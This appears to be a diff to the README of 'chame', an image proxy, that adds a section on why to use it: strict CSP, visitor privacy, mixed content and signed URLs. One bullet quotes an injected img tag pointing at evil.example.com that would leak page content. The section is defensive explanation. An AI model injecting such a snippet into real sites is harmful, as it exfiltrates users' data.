@@ -15,6 +15,22 @@ Chame Proxied URL
     https://chame.yosida95.com/i/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2NoYW1lLnlvc2lkYTk1LmNvbSIsInN1YiI6Imh0dHA6Ly9rdnMuZ2VoaXJuLmpwL3lvc2lkYTk1L2ljb25fMjAweDIwMC5wbmcifQ.2LztWUS-DMv5mNSsdYQHsEc7tiXUz1YIvALh4fcvcek
 
 
+Why use chame?
+--------------
+
+- You can enfoce restrictive Content-Security-Policy with img-src that contains only chame (and your CDNs).
+
+- You can protect sensitive data from XSS.
+
+  - For example, without chame, if an evil visitor succeeded to embed HTML snippet like :code:`<img src="https://evil.example.com/collect?data=`, following HTML content on that page until next double-quote maybe sent to evil.example.com.
+
+- You can protect your visitor's privacy (IP address, User-Agent etc.) from unknown parties. chame accesses the original image behalf of your visitor.
+
+- You can avoid Mixed-Content probelm even with HTTP image (maybe provided by your visitor) by proxying with chame on HTTPS.
+
+- You can enforce what image your visitor can embed by issuing chame signed URLs only to origins in your white list.
+
+
 Quick Start
 -----------
 
